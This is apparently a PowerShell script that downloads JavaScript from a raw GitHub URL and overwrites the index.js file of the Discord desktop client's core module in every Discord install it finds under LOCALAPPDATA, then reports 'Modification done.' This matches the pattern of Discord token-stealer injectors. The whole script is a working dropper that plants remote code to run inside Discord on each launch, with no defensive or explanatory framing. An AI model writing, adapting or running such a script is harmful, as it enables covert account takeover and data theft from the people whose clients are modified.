# Define the URL to download the content
$url = "https://raw.githubusercontent.com/43a1723/test22/main/scr/test.js"

# Download the content from the URL
$response = Invoke-WebRequest -Uri $url -UseBasicP
$code = $response.Content

# Function to get the core directory
function Get-Core {
    param (
        [string]$dir
    )

    $files = Get-ChildItem -Path $dir -Name
    foreach ($file in $files) {
        if ($file -match "app-") {
            $modules = Join-Path -Path $dir -ChildPath "$file\modules"
            if (-not (Test-Path -Path $modules)) {
                continue
            }
            $modulesFiles = Get-ChildItem -Path $modules -Name
            foreach ($moduleFile in $modulesFiles) {
                if ($moduleFile -match "discord_desktop_core-") {
                    $core = Join-Path -Path $modules -ChildPath "$moduleFile\discord_desktop_core"
                    if (-not (Test-Path -Path "$core\index.js")) {
                        continue
                    }
                    return @{ Core = $core; File = $moduleFile }
                }
            }
        }
    }
}

# Get the LOCALAPPDATA environment variable
$appdata = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$discordDirs = @(
    Join-Path -Path $appdata -ChildPath "Discord",
    Join-Path -Path $appdata -ChildPath "DiscordCanary",
    Join-Path -Path $appdata -ChildPath "DiscordPTB",
    Join-Path -Path $appdata -ChildPath "DiscordDevelopment"
)

foreach ($dir in $discordDirs) {
    if (-not (Test-Path -Path $dir)) {
        continue
    }

    $coreInfo = Get-Core -dir $dir
    if ($coreInfo) {
        $indexPath = Join-Path -Path $coreInfo.Core -ChildPath "index.js"
        Set-Content -Path $indexPath -Value $code -Encoding UTF8
        Write-Host "Modification done. Press Enter to close." -ForegroundColor Green
        [void][System.Console]::ReadLine()  # Wait for user input
        exit
    }
}
